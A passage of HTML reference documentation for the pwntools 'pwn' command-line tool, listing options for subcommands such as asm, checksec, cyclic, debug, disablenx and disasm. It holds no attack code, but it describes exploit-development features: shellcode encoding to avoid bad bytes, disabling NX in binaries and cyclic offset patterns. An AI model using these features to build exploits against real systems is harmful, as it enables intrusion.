<code class="descname">-f</code><code class="descclassname"> {raw,hex,string,elf}</code><code class="descclassname">, </code><code class="descname">--format</code><code class="descclassname"> {raw,hex,string,elf}</code><a class="headerlink" href="#cmdoption-pwn-asm-f" title="Permalink to this definition">¶</a></dt>
<dd><p>Output format (defaults to hex for ttys, otherwise raw)</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-asm-o">
<code class="descname">-o</code><code class="descclassname"> &lt;file&gt;</code><code class="descclassname">, </code><code class="descname">--output</code><code class="descclassname"> &lt;file&gt;</code><a class="headerlink" href="#cmdoption-pwn-asm-o" title="Permalink to this definition">¶</a></dt>
<dd><p>Output file (defaults to stdout)</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-asm-c">
<code class="descname">-c</code><code class="descclassname"> {16,32,64,android,cgc,freebsd,linux,windows,powerpc64,aarch64,sparc64,powerpc,mips64,msp430,thumb,amd64,sparc,alpha,s390,i386,m68k,mips,ia64,cris,vax,avr,arm,little,big,el,le,be,eb}</code><code class="descclassname">, </code><code class="descname">--context</code><code class="descclassname"> {16,32,64,android,cgc,freebsd,linux,windows,powerpc64,aarch64,sparc64,powerpc,mips64,msp430,thumb,amd64,sparc,alpha,s390,i386,m68k,mips,ia64,cris,vax,avr,arm,little,big,el,le,be,eb}</code><a class="headerlink" href="#cmdoption-pwn-asm-c" title="Permalink to this definition">¶</a></dt>
<dd><p>The os/architecture/endianness/bits the shellcode will run in (default: linux/i386), choose from: [&#8216;16&#8217;, &#8216;32&#8217;, &#8216;64&#8217;, &#8216;android&#8217;, &#8216;cgc&#8217;, &#8216;freebsd&#8217;, &#8216;linux&#8217;, &#8216;windows&#8217;, &#8216;powerpc64&#8217;, &#8216;aarch64&#8217;, &#8216;sparc64&#8217;, &#8216;powerpc&#8217;, &#8216;mips64&#8217;, &#8216;msp430&#8217;, &#8216;thumb&#8217;, &#8216;amd64&#8217;, &#8216;sparc&#8217;, &#8216;alpha&#8217;, &#8216;s390&#8217;, &#8216;i386&#8217;, &#8216;m68k&#8217;, &#8216;mips&#8217;, &#8216;ia64&#8217;, &#8216;cris&#8217;, &#8216;vax&#8217;, &#8216;avr&#8217;, &#8216;arm&#8217;, &#8216;little&#8217;, &#8216;big&#8217;, &#8216;el&#8217;, &#8216;le&#8217;, &#8216;be&#8217;, &#8216;eb&#8217;]</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-asm-v">
<code class="descname">-v</code><code class="descclassname"> &lt;avoid&gt;</code><code class="descclassname">, </code><code class="descname">--avoid</code><code class="descclassname"> &lt;avoid&gt;</code><a class="headerlink" href="#cmdoption-pwn-asm-v" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode to avoid the listed bytes (provided as hex; default: 000a)</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-asm-n">
<code class="descname">-n</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--newline</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-asm-n" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode to avoid newlines</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-asm-z">
<code class="descname">-z</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--zero</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-asm-z" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode to avoid NULL bytes</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-asm-d">
<code class="descname">-d</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--debug</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-asm-d" title="Permalink to this definition">¶</a></dt>
<dd><p>Debug the shellcode with GDB</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-asm-e">
<code class="descname">-e</code><code class="descclassname"> &lt;encoder&gt;</code><code class="descclassname">, </code><code class="descname">--encoder</code><code class="descclassname"> &lt;encoder&gt;</code><a class="headerlink" href="#cmdoption-pwn-asm-e" title="Permalink to this definition">¶</a></dt>
<dd><p>Specific encoder to use</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-asm-i">
<code class="descname">-i</code><code class="descclassname"> &lt;infile&gt;</code><code class="descclassname">, </code><code class="descname">--infile</code><code class="descclassname"> &lt;infile&gt;</code><a class="headerlink" href="#cmdoption-pwn-asm-i" title="Permalink to this definition">¶</a></dt>
<dd><p>Specify input file</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-asm-r">
<code class="descname">-r</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--run</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-asm-r" title="Permalink to this definition">¶</a></dt>
<dd><p>Run output</p>
</dd></dl>

</div>
<div class="section" id="pwn-checksec">
<h5>pwn checksec<a class="headerlink" href="#pwn-checksec" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-checksec-arg-elf">
<code class="descname">elf</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-checksec-arg-elf" title="Permalink to this definition">¶</a></dt>
<dd><p>Files to check</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-checksec-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-checksec-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-checksec-file">
<code class="descname">--file</code><code class="descclassname"> &lt;elf&gt;</code><a class="headerlink" href="#cmdoption-pwn-checksec-file" title="Permalink to this definition">¶</a></dt>
<dd><p>File to check (for compatibility with checksec.sh)</p>
</dd></dl>

</div>
<div class="section" id="pwn-constgrep">
<h5>pwn constgrep<a class="headerlink" href="#pwn-constgrep" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-constgrep-arg-regex">
<code class="descname">regex</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-constgrep-arg-regex" title="Permalink to this definition">¶</a></dt>
<dd><p>The regex matching constant you want to find</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-constgrep-arg-constant">
<code class="descname">constant</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-constgrep-arg-constant" title="Permalink to this definition">¶</a></dt>
<dd><p>The constant to find</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-constgrep-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-constgrep-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-constgrep-e">
<code class="descname">-e</code><code class="descclassname"> &lt;constant&gt;</code><code class="descclassname">, </code><code class="descname">--exact</code><code class="descclassname"> &lt;constant&gt;</code><a class="headerlink" href="#cmdoption-pwn-constgrep-e" title="Permalink to this definition">¶</a></dt>
<dd><p>Do an exact match for a constant instead of searching for a regex</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-constgrep-i">
<code class="descname">-i</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--case-insensitive</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-constgrep-i" title="Permalink to this definition">¶</a></dt>
<dd><p>Search case insensitive</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-constgrep-m">
<code class="descname">-m</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--mask-mode</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-constgrep-m" title="Permalink to this definition">¶</a></dt>
<dd><p>Instead of searching for a specific constant value, search for values not containing strictly less bits that the given value.</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-constgrep-c">
<code class="descname">-c</code><code class="descclassname"> {16,32,64,android,cgc,freebsd,linux,windows,powerpc64,aarch64,sparc64,powerpc,mips64,msp430,thumb,amd64,sparc,alpha,s390,i386,m68k,mips,ia64,cris,vax,avr,arm,little,big,el,le,be,eb}</code><code class="descclassname">, </code><code class="descname">--context</code><code class="descclassname"> {16,32,64,android,cgc,freebsd,linux,windows,powerpc64,aarch64,sparc64,powerpc,mips64,msp430,thumb,amd64,sparc,alpha,s390,i386,m68k,mips,ia64,cris,vax,avr,arm,little,big,el,le,be,eb}</code><a class="headerlink" href="#cmdoption-pwn-constgrep-c" title="Permalink to this definition">¶</a></dt>
<dd><p>The os/architecture/endianness/bits the shellcode will run in (default: linux/i386), choose from: [&#8216;16&#8217;, &#8216;32&#8217;, &#8216;64&#8217;, &#8216;android&#8217;, &#8216;cgc&#8217;, &#8216;freebsd&#8217;, &#8216;linux&#8217;, &#8216;windows&#8217;, &#8216;powerpc64&#8217;, &#8216;aarch64&#8217;, &#8216;sparc64&#8217;, &#8216;powerpc&#8217;, &#8216;mips64&#8217;, &#8216;msp430&#8217;, &#8216;thumb&#8217;, &#8216;amd64&#8217;, &#8216;sparc&#8217;, &#8216;alpha&#8217;, &#8216;s390&#8217;, &#8216;i386&#8217;, &#8216;m68k&#8217;, &#8216;mips&#8217;, &#8216;ia64&#8217;, &#8216;cris&#8217;, &#8216;vax&#8217;, &#8216;avr&#8217;, &#8216;arm&#8217;, &#8216;little&#8217;, &#8216;big&#8217;, &#8216;el&#8217;, &#8216;le&#8217;, &#8216;be&#8217;, &#8216;eb&#8217;]</p>
</dd></dl>

</div>
<div class="section" id="pwn-cyclic">
<h5>pwn cyclic<a class="headerlink" href="#pwn-cyclic" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-cyclic-arg-count">
<code class="descname">count</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-cyclic-arg-count" title="Permalink to this definition">¶</a></dt>
<dd><p>Number of characters to print</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-cyclic-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-cyclic-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-cyclic-a">
<code class="descname">-a</code><code class="descclassname"> &lt;alphabet&gt;</code><code class="descclassname">, </code><code class="descname">--alphabet</code><code class="descclassname"> &lt;alphabet&gt;</code><a class="headerlink" href="#cmdoption-pwn-cyclic-a" title="Permalink to this definition">¶</a></dt>
<dd><p>The alphabet to use in the cyclic pattern (defaults to all lower case letters)</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-cyclic-n">
<code class="descname">-n</code><code class="descclassname"> &lt;length&gt;</code><code class="descclassname">, </code><code class="descname">--length</code><code class="descclassname"> &lt;length&gt;</code><a class="headerlink" href="#cmdoption-pwn-cyclic-n" title="Permalink to this definition">¶</a></dt>
<dd><p>Size of the unique subsequences (defaults to 4).</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-cyclic-c">
<code class="descname">-c</code><code class="descclassname"> {16,32,64,android,cgc,freebsd,linux,windows,powerpc64,aarch64,sparc64,powerpc,mips64,msp430,thumb,amd64,sparc,alpha,s390,i386,m68k,mips,ia64,cris,vax,avr,arm,little,big,el,le,be,eb}</code><code class="descclassname">, </code><code class="descname">--context</code><code class="descclassname"> {16,32,64,android,cgc,freebsd,linux,windows,powerpc64,aarch64,sparc64,powerpc,mips64,msp430,thumb,amd64,sparc,alpha,s390,i386,m68k,mips,ia64,cris,vax,avr,arm,little,big,el,le,be,eb}</code><a class="headerlink" href="#cmdoption-pwn-cyclic-c" title="Permalink to this definition">¶</a></dt>
<dd><p>The os/architecture/endianness/bits the shellcode will run in (default: linux/i386), choose from: [&#8216;16&#8217;, &#8216;32&#8217;, &#8216;64&#8217;, &#8216;android&#8217;, &#8216;cgc&#8217;, &#8216;freebsd&#8217;, &#8216;linux&#8217;, &#8216;windows&#8217;, &#8216;powerpc64&#8217;, &#8216;aarch64&#8217;, &#8216;sparc64&#8217;, &#8216;powerpc&#8217;, &#8216;mips64&#8217;, &#8216;msp430&#8217;, &#8216;thumb&#8217;, &#8216;amd64&#8217;, &#8216;sparc&#8217;, &#8216;alpha&#8217;, &#8216;s390&#8217;, &#8216;i386&#8217;, &#8216;m68k&#8217;, &#8216;mips&#8217;, &#8216;ia64&#8217;, &#8216;cris&#8217;, &#8216;vax&#8217;, &#8216;avr&#8217;, &#8216;arm&#8217;, &#8216;little&#8217;, &#8216;big&#8217;, &#8216;el&#8217;, &#8216;le&#8217;, &#8216;be&#8217;, &#8216;eb&#8217;]</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-cyclic-l">
<code class="descname">-l</code><code class="descclassname"> &lt;lookup_value&gt;</code><code class="descclassname">, </code><code class="descname">-o</code><code class="descclassname"> &lt;lookup_value&gt;</code><code class="descclassname">, </code><code class="descname">--offset</code><code class="descclassname"> &lt;lookup_value&gt;</code><code class="descclassname">, </code><code class="descname">--lookup</code><code class="descclassname"> &lt;lookup_value&gt;</code><a class="headerlink" href="#cmdoption-pwn-cyclic-l" title="Permalink to this definition">¶</a></dt>
<dd><p>Do a lookup instead printing the alphabet</p>
</dd></dl>

</div>
<div class="section" id="pwn-debug">
<h5>pwn debug<a class="headerlink" href="#pwn-debug" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-debug-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-debug-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-debug-x">
<code class="descname">-x</code><code class="descclassname"> &lt;gdbscript&gt;</code><a class="headerlink" href="#cmdoption-pwn-debug-x" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute GDB commands from this file.</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-debug-pid">
<code class="descname">--pid</code><code class="descclassname"> &lt;pid&gt;</code><a class="headerlink" href="#cmdoption-pwn-debug-pid" title="Permalink to this definition">¶</a></dt>
<dd><p>PID to attach to</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-debug-c">
<code class="descname">-c</code><code class="descclassname"> {16,32,64,android,cgc,freebsd,linux,windows,powerpc64,aarch64,sparc64,powerpc,mips64,msp430,thumb,amd64,sparc,alpha,s390,i386,m68k,mips,ia64,cris,vax,avr,arm,little,big,el,le,be,eb}</code><code class="descclassname">, </code><code class="descname">--context</code><code class="descclassname"> {16,32,64,android,cgc,freebsd,linux,windows,powerpc64,aarch64,sparc64,powerpc,mips64,msp430,thumb,amd64,sparc,alpha,s390,i386,m68k,mips,ia64,cris,vax,avr,arm,little,big,el,le,be,eb}</code><a class="headerlink" href="#cmdoption-pwn-debug-c" title="Permalink to this definition">¶</a></dt>
<dd><p>The os/architecture/endianness/bits the shellcode will run in (default: linux/i386), choose from: [&#8216;16&#8217;, &#8216;32&#8217;, &#8216;64&#8217;, &#8216;android&#8217;, &#8216;cgc&#8217;, &#8216;freebsd&#8217;, &#8216;linux&#8217;, &#8216;windows&#8217;, &#8216;powerpc64&#8217;, &#8216;aarch64&#8217;, &#8216;sparc64&#8217;, &#8216;powerpc&#8217;, &#8216;mips64&#8217;, &#8216;msp430&#8217;, &#8216;thumb&#8217;, &#8216;amd64&#8217;, &#8216;sparc&#8217;, &#8216;alpha&#8217;, &#8216;s390&#8217;, &#8216;i386&#8217;, &#8216;m68k&#8217;, &#8216;mips&#8217;, &#8216;ia64&#8217;, &#8216;cris&#8217;, &#8216;vax&#8217;, &#8216;avr&#8217;, &#8216;arm&#8217;, &#8216;little&#8217;, &#8216;big&#8217;, &#8216;el&#8217;, &#8216;le&#8217;, &#8216;be&#8217;, &#8216;eb&#8217;]</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-debug-exec">
<code class="descname">--exec</code><code class="descclassname"> &lt;executable&gt;</code><a class="headerlink" href="#cmdoption-pwn-debug-exec" title="Permalink to this definition">¶</a></dt>
<dd><p>File to debug</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-debug-process">
<code class="descname">--process</code><code class="descclassname"> &lt;process_name&gt;</code><a class="headerlink" href="#cmdoption-pwn-debug-process" title="Permalink to this definition">¶</a></dt>
<dd><p>Name of the process to attach to (e.g. &#8220;bash&#8221;)</p>
</dd></dl>

</div>
<div class="section" id="pwn-disablenx">
<h5>pwn disablenx<a class="headerlink" href="#pwn-disablenx" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-disablenx-arg-elf">
<code class="descname">elf</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-disablenx-arg-elf" title="Permalink to this definition">¶</a></dt>
<dd><p>Files to check</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-disablenx-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-disablenx-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

</div>
<div class="section" id="pwn-disasm">
<h5>pwn disasm<a class="headerlink" href="#pwn-disasm" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-disasm-arg-hex">
<code class="descname">hex</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-disasm-arg-hex" title="Permalink to this definition">¶</a></dt>
<dd><p>Hex-string to disasemble. If none are supplied, then it uses stdin in non-hex mode.</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-disasm-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-disasm-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-disasm-c">
<code class="descname">-c</code><code class="descclassname"> {16,32,64,android,cgc,freebsd,linux,windows,powerpc64,aarch64,sparc64,powerpc,mips64,msp430,thumb,amd64,sparc,alpha,s390,i386,m68k,mips,ia64,cris,vax,avr,arm,little,big,el,le,be,eb}</code><code class="descclassname">, </code><code class="descname">--context</code><code class="descclassname"> {16,32,64,android,cgc,freebsd,linux,windows,powerpc64,aarch64,sparc64,powerpc,mips64,msp430,thumb,amd64,sparc,alpha,s390,i386,m68k,mips,ia64,cris,vax,avr,arm,little,big,el,le,be,eb}</code><a class="headerlink" href="#cmdoption-pwn-disasm-c" title="Permalink to this definition">¶</a></dt>
<dd><p>The os/architecture/endianness/bits the shellcode will run in (default: linux/i386), choose from: [&#8216;16&#8217;, &#8216;32&#8217;, &#8216;64&#8217;, &#8216;android&#8217;, &#8216;cgc&#8217;, &#8216;freebsd&#8217;, &#8216;linux&#8217;, &#8216;windows&#8217;, &#8216;powerpc64&#8217;, &#8216;aarch64&#8217;, &#8216;sparc64&#8217;, &#8216;powerpc&#8217;, &#8216;mips64&#8217;, &#8216;msp430&#8217;, &#8216;thumb&#8217;, &#8216;amd64&#8217;, &#8216;sparc&#8217;, &#8216;alpha&#8217;, &#8216;s390&#8217;, &#8216;i386&#8217;, &#8216;m68k&#8217;, &#8216;mips&#8217;, &#8216;ia64&#8217;, &#8216;cris&#8217;, &#8216;vax&#8217;, &#8216;avr&#8217;, &#8216;arm&#8217;, &#8216;little&#8217;, &#8216;big&#8217;, &#8216;el&#8217;, &#8216;le&#8217;, &#8216;be&#8217;, &#8216;eb&#8217;]</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-disasm-a">
<code class="descname">-a</code><code class="descclassname"> &lt;address&gt;</code><code class="descclassname">, </code><code class="descname">--address</code><code class="descclassname"> &lt;address&gt;</code><a class="headerlink" href="#cmdoption-pwn-disasm-a" title="Permalink to this definition">¶</a></dt>
<dd><p>Base address</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-disasm-color">
<code class="descname">--color</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-disasm-color" title="Permalink to this definition">¶</a></dt>
<dd><p>Color output</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-disasm-no-color">
<code class="descname">--no-color</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-disasm-no-color" title="Permalink to this definition">¶</a></dt>
<dd><p>Disable color output</p>
</dd></dl>

</div>
<div class="section" id="pwn-elfdiff">
<h5>pwn elfdiff<a class="headerlink" href="#pwn-elfdiff" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-elfdiff-arg-a">
<code class="descname">a</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-elfdiff-arg-a" title="Permalink to this definition">¶</a></dt>
<dd></dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-elfdiff-arg-b">
<code class="descname">b</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-elfdiff-arg-b" title="Permalink to this definition">¶</a></dt>
<dd></dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-elfdiff-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-elfdiff-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

</div>
<div class="section" id="pwn-elfpatch">
<h5>pwn elfpatch<a class="headerlink" href="#pwn-elfpatch" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-elfpatch-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-elfpatch-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

</div>
<div class="section" id="pwn-errno">
<h5>pwn errno<a class="headerlink" href="#pwn-errno" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-errno-arg-error">
<code class="descname">error</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-errno-arg-error" title="Permalink to this definition">¶</a></dt>
<dd><p>Error message or value</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-errno-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-errno-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

</div>
<div class="section" id="pwn-hex">
<h5>pwn hex<a class="headerlink" href="#pwn-hex" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-hex-arg-data">
<code class="descname">data</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-hex-arg-data" title="Permalink to this definition">¶</a></dt>
<dd><p>Data to convert into hex</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-hex-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-hex-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

</div>
<div class="section" id="pwn-phd">
<h5>pwn phd<a class="headerlink" href="#pwn-phd" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-phd-arg-file">
<code class="descname">file</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-phd-arg-file" title="Permalink to this definition">¶</a></dt>
<dd><p>File to hexdump.  Reads from stdin if missing.</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-phd-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-phd-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-phd-w">
<code class="descname">-w</code><code class="descclassname"> &lt;width&gt;</code><code class="descclassname">, </code><code class="descname">--width</code><code class="descclassname"> &lt;width&gt;</code><a class="headerlink" href="#cmdoption-pwn-phd-w" title="Permalink to this definition">¶</a></dt>
<dd><p>Number of bytes per line.</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-phd-l">
<code class="descname">-l</code><code class="descclassname"> &lt;highlight&gt;</code><code class="descclassname">, </code><code class="descname">--highlight</code><code class="descclassname"> &lt;highlight&gt;</code><a class="headerlink" href="#cmdoption-pwn-phd-l" title="Permalink to this definition">¶</a></dt>
<dd><p>Byte to highlight.</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-phd-s">
<code class="descname">-s</code><code class="descclassname"> &lt;skip&gt;</code><code class="descclassname">, </code><code class="descname">--skip</code><code class="descclassname"> &lt;skip&gt;</code><a class="headerlink" href="#cmdoption-pwn-phd-s" title="Permalink to this definition">¶</a></dt>
<dd><p>Skip this many initial bytes.</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-phd-c">
<code class="descname">-c</code><code class="descclassname"> &lt;count&gt;</code><code class="descclassname">, </code><code class="descname">--count</code><code class="descclassname"> &lt;count&gt;</code><a class="headerlink" href="#cmdoption-pwn-phd-c" title="Permalink to this definition">¶</a></dt>
<dd><p>Only show this many bytes.</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-phd-o">
<code class="descname">-o</code><code class="descclassname"> &lt;offset&gt;</code><code class="descclassname">, </code><code class="descname">--offset</code><code class="descclassname"> &lt;offset&gt;</code><a class="headerlink" href="#cmdoption-pwn-phd-o" title="Permalink to this definition">¶</a></dt>
<dd><p>Addresses in left hand column starts at this address.</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-phd-color">
<code class="descname">--color</code><code class="descclassname"> {always,never,auto}</code><a class="headerlink" href="#cmdoption-pwn-phd-color" title="Permalink to this definition">¶</a></dt>
<dd><p>Colorize the output.  When &#8216;auto&#8217; output is colorized exactly when stdout is a TTY.  Default is &#8216;auto&#8217;.</p>
</dd></dl>

</div>
<div class="section" id="pwn-pwnstrip">
<h5>pwn pwnstrip<a class="headerlink" href="#pwn-pwnstrip" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-pwnstrip-arg-file">
<code class="descname">file</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-pwnstrip-arg-file" title="Permalink to this definition">¶</a></dt>
<dd></dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-pwnstrip-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-pwnstrip-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-pwnstrip-b">
